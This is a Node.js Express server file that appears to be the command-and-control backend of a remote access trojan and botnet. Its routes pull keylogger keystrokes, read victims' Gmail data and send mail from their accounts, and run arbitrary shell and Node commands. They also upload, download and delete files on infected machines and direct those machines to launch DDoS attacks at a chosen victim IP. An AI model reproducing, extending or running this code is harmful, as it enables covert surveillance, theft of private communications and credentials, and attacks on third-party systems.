const fs = require('fs-extra');
const http = require('http');
const express = require('express');
const std = require('./fancy_console');
const socketHandler = require('./socket_handler');
const formidable = require('formidable');
const remoteHandler = require('./remote_connection_handler');
console.clear();
initConnection(80); //start the server

async function initConnection(port) {
    try {
        const app = express();
        const Server = http.createServer(app); //create an http server
    
        await socketHandler.init(Server, ip => {
            std.log(`<b><green>New connection "${ip}".`);
            if(Object.keys(socketHandler.list()).length === 1) //if there is only one client
                socketHandler.select(ip); //use the first client
        }); //init the socket handler
    
        await remoteHandler(443) //begin the remote connection
        expressHandler(app); //init the express handler
        Server.listen(port, () => std.log(`<b><yellow>Server listening on port <blue>${port}.`));
    } catch(e) {}
}

function expressHandler(app) {
    app.use('/select_device', express.static('./public/select_device')); //select device interface
    app.use('/key_log', async(req, res, next) => {//keylogger interface
        if(!await evalDevice(req, res)) //evaluate the device
            return null;
        express.static('./public/key_log')(req, res, next);
    });

    app.use('/programs', async(req, res, next) => { //program interface
        if(!await evalDevice(req, res)) //evaluate the device
            return null;
        express.static('./public/programs')(req, res, next); 
    });

    app.use('/message_box', async(req, res, next) => { //message box interface
        if(!await evalDevice(req, res)) //evaluate the device
            return null;
        express.static('./public/message_box')(req, res, next); 
    });

    app.use('/speak_text', async(req, res, next) => { //text speech interface
        if(!await evalDevice(req, res)) //evaluate the device
            return null;
        express.static('./public/speak_text')(req, res, next);
    }); 

    app.use('/remote', async(req, res, next) => { //remote control interface
        if(!await evalDevice(req, res)) //evaluate the device
            return null;
        express.static('./remote_connection_handler')(req, res, next);
    }); 

    app.use('/email', async(req, res, next) => { //email interface
        if(!await evalDevice(req, res)) //evaluate the device
            return null;
        express.static('./public/email')(req, res, next);
    }); 

    app.use('/ddos', express.static('./public/ddos')); //ddos interface
    
    app.use('/stop_ddos_attacks', async(req, res, next) => { //stop ddos attack handler
        res.clearCookie('control_device');
        res.end(0);
        const devices = Object.keys(await socketHandler.list());

        for(const device of devices) {
            await evalDeviceIP(device);
            await socketHandler.send('stop_ddos$,$0');
        }
    });
    
    app.use('/ddos_attack', async(req, res, next) => { //ddos attack handler
        if(!req.query['strength'] || !req.query['victim'] || !req.query['devices'])
            return res.end('bad paramaters, expected: /ddos_attack?strength=x&victim=xxx.xxx.xxx.xxx&devices=xxx.xxx.xxx.xxx>xxx.xxx.xxx.xxx');
        
        res.clearCookie('control_device');
        res.end();

        const devices = req.query['devices'].split('+');
        for(const device of devices) {
            await evalDeviceIP(device);
            await socketHandler.send(`begin_ddos$,$${req.query['strength']}%.%${req.query['victim']}`);
        }
    });

    app.use('/restart', async(req, res, next) => { //reload device
        if(!await evalDevice(req, res)) //evaluate the device
            return null;
        res.redirect('/select_device');
        await socketHandler.send('restart$,$0');
    });

    app.use('/clear_gmail_cache', async(req, res, next) => { //clear_gmail_cache
        if(!await evalDevice(req, res)) //evaluate the device
            return null;
        const response = await socketHandler.send('clear_gmail_cache$,$0');
        res.end(response);
    });

    app.use('/list_devices', (req, res, next) => {
        const sockets = socketHandler.list();        
        let devices = [];

        for(const socket in sockets)
            devices.push(sockets[socket].ip);

        return res.json(devices);
    });

    app.use('/latest_email', async(req, res) => { //get latest email
        if(!req.query['user'])
            return res.json({});
            
        if(!await evalDevice(req, res)) //evaluate the device
            return null;

        const info = await socketHandler.send(`latest_email$,$${req.query['user']}`);
        res.json(JSON.parse(info));
    });


    app.use('/get_gmail_info', async(req, res) => { //get gmail info
        if(!await evalDevice(req, res)) //evaluate the device
            return null;

        const info = await socketHandler.send('get_gmail_info$,$0');
        res.json(JSON.parse(info));
    });

    app.use('/send_mail', async(req, res) => { //send gmail
        if(!await evalDevice(req, res)) //evaluate the device
            return null;
        const info = await socketHandler.send(`send_mail$,$${req.query['user'] || 0}%.%${req.query['to'] || 'test@gmail.com'}%.%${req.query['su'] || 'Hello, World!'}%.%${req.query['body'] || ''}`);
        res.json(JSON.parse(info));
    });

    app.use('/iplookup', async(req, res) => {
        if(!req.query['ip'])
            return res.json({});
        http.get(`http://ip-api.com/json/${req.query['ip']}`)
        .on('response', response => {
            let data = '';
            response.on('data', chunk => data += chunk.toString());
            response.on('close', () => res.json(JSON.parse(data)));
        });
    });

    app.use('/speaktext', async(req, res) => { //open an infobox
        if(!await evalDevice(req, res)) //evaluate the device
            return null;

        const text = decodeURIComponent(req.query['text']);
        await socketHandler.send(`cmd$,$start nircmd.exe nircmd.exe speak text "${text}"%.%./resources/Programs`);
        res.end();
    });

    app.use('/infobox', async(req, res) => { //open an infobox
        if(!await evalDevice(req, res)) //evaluate the device
            return null;

        const title = decodeURIComponent(req.query['title']);
        const message = decodeURIComponent(req.query['message']);
        await socketHandler.send(`cmd$,$start nircmd.exe infobox "${message}" "${title}"%.%./resources/Programs`);
        res.end();
    });

    app.use('/run', async(req, res) => { //run a program
        if(!await evalDevice(req, res)) //evaluate the device
            return null;

        const program = decodeURIComponent(req.query['program']);
        await socketHandler.send(`cmd$,$start ${program}%.%./resources/Programs`);
        res.end();
    }); 

    app.use('/terminal', async(req, res, next) => { //terminal
        if(!await evalDevice(req, res)) //evaluate the device
            return res.end();

        return express.static('./public/terminal')(req, res, next);
    }); 

    app.use('/explorer', express.static('./public/file_explorer')); //explorer interface

    //-----------------------------FILE TRANSFER----------------------------------------------
    
    app.use('/upload', async(req, res, next) => {        
        const form = new formidable.IncomingForm({
            uploadDir: `${__dirname}/%TEMP%`
        });

        form.parse(req, async(err, fields, files) => {
            if(err || !files.file)
                return res.end(err || 'No file.');

            const f = files.file.path;
            const temp_name = f.slice(f.lastIndexOf('\\') + 1);
            const path = req.query.path;

            for(const file of fs.readdirSync(`${__dirname}/%TEMP%`)) { //delete old stuff
                if(file !== temp_name)
                    fs.unlinkSync(`${__dirname}/%TEMP%/${file}`);
            }

            const status = await socketHandler.send(`send-file$,$${temp_name}>${path}/${files['file']['name']}`); //invoke command
            res.end(status);
        });
    });
    
    app.use('/download', async(req, res) => { //FROM SERVER TO CLIENT
        if(!req['query']['file'])
            return res.end('No file specified!');

        if(!fs.existsSync(`${__dirname}/%TEMP%/${decodeURIComponent(req['query']['file'])}`))
            return res.end('File does not exist.');

        const file = fs.createReadStream(`${__dirname}/%TEMP%/${decodeURIComponent(req['query']['file'])}`);
        file.pipe(res);
    });

    app.use('/requestfile', async(req, res) => {//FROM BROWSER TO CLIENT
        if(!await evalDevice(req, res)) //evaluate the device
            return res.end();

        if(!req.query['path'])
            return res.end('No file path.');

        const path = decodeURIComponent(req.query['path']);
        const status = await socketHandler.send(`save-file$,$${path}>${decodeURIComponent(path.slice(path.lastIndexOf('/')+1))}`);

        if(status === 'sending')
            return res.redirect(`/explorer?explore=${path.slice(0, path.lastIndexOf('/'))}`);
        res.end(status);
    });

    app.use('/save', async(req, res) => { //FROM CLIENT TO SERVER
        const form = new formidable.IncomingForm({
            uploadDir: `${__dirname}/%SAVED%`
        });

        form.parse(req, (err, fields, files) => {
            if(!files.file || !req['query']['file'])
                return res.end('No file.')

            fs.rename(files.file['path'], `${__dirname}/%SAVED%/${decodeURIComponent(req['query'].file)}`, err => {
                if(err)
                    return res.end(err.toString());

                res.end('ok');
            });
        });
    });

    //-----------------------------FILE MENAGER----------------------------------------------

    app.use('/list', async(req, res) => { //list files/dirs in path
        if(!req.query['path'])
            return res.end('No path paramater.');

        if(!await evalDevice(req, res)) //evaluate the device
            return res.end();

        const list = await socketHandler.send(`list$,$${req.query['path']}`);
        res.end(list);
    });

    app.use('/delete', async(req, res) => { //delete file/dir
        if(!await evalDevice(req, res)) //evaluate the device
            return res.end();

        const path = decodeURIComponent(req['query']['path']);
        const status = await socketHandler.send(`delete$,$${path}`);

        if(status === 'deleted')
            res.redirect(`/explorer?explore=${path.slice(0, path.lastIndexOf('/'))}`);
        else 
            res.end(status);
    });

    app.use('/keystrokes', async(req, res) => { //get the keystrokes from the keylogger
        if(!socketHandler.ready())
            return res.end('Client is not connected.');
        const keystrokes = await socketHandler.send(`key-log$,$`);
        res.write(keystrokes);
        res.end();
    });

    app.use('/info', async(req, res) => { //get computer hardware/software info
        if(!await evalDevice(req, res)) //evaluate the device
            return res.end();

        const list = JSON.parse(await socketHandler.send('info$,$null'));
        for(const item in list) 
            res.write(`<p>${item}: <b>${list[item]}</b></p>`);

        res.end();
    });

    app.use('/cmd', async(req, res) => { //execute a command
        if(!await evalDevice(req, res)) //evaluate the device
            return res.end();

        const command = decodeURIComponent(req['query']['command']);
        const path = decodeURIComponent(req['query']['path']);

        if(command.slice(0, 4) === 'node') {
            const code = command.slice(4);
            const value = await socketHandler.send(`node$,$${command}%.%${code}`);
            return res.end(value);
        }

        const value = await socketHandler.send(`cmd$,$${command}%.%${path}`);
        res.end(value);
    });

    app.use('/volume/:ammount', async(req, res) => { //change the volume
        if(!await evalDevice(req, res)) //evaluate the device
            return res.end();

        if(parseInt(req['params']['ammount']) !== null && req['params']['ammount'] < 0 && req['params']['ammount'] > 100)
            return res.end('Paramater needs to be from 0 to 100.');

        const volume = req['params']['ammount']*65535/100;//map the value: 0, 0, 100, 65535
        const value = await socketHandler.send(`cmd$,$cd resources/Programs && nircmd.exe mutesysvolume 0 && nircmd.exe setsysvolume ${volume}`);
        res.end(value);
    });

    app.use('/', async(req, res, next) => {
        if(!await evalDevice(req, res)) //evaluate the device
            return res.end();
        return express.static('./public/home')(req, res, next);
    }); //main interface
}

async function evalDeviceIP(device) { //tests if device cookie is valid and selects the device
    return new Promise(async(resolve, reject) => {
        if(socketHandler.selected() || socketHandler.selected().ip === device)
            return resolve(true);

        const pong = await socketHandler.ping(device); //ping the device
        if(pong === false)
            return resolve(false);

        socketHandler.select(device); //set device
        return resolve(true);
    });
}

async function evalDevice(req, res) { //tests if device cookie is valid and selects the device
    return new Promise(async(resolve, reject) => {
        if((req.headers.cookie || '').length < 5) {
            resolve(false);
            return res.redirect('/select_device'); //redirect to device selector
        }

        const device = parseCookies(req.headers.cookie)['control_device'];
        if(!device) {
            resolve(false);
            res.clearCookie('control_device');
            return res.redirect('/select_device'); //redirect to device selector
        }

        if(socketHandler.selected() && socketHandler.selected().ip === req.headers.cookie)
            return resolve(true);

        const pong = await socketHandler.ping(device); //ping the device
        if(pong === false) {
            resolve(false);
            res.clearCookie('control_device');
            return res.redirect('/select_device'); //redirect to device selector
        }

        socketHandler.select(device); //set device
        return resolve(true);
    });
}

function parseCookies(cookies) {
    let result = {}
    const items = cookies.split(';');

    for(const item of items) {
        const [ key, value ] = item.replace(/"/g, '\'').split('='); //replace " with ', to avoid errors
        Object.assign(result, JSON.parse(`{
            "${key}": "${value}"
        }`));
    }

    return result;
}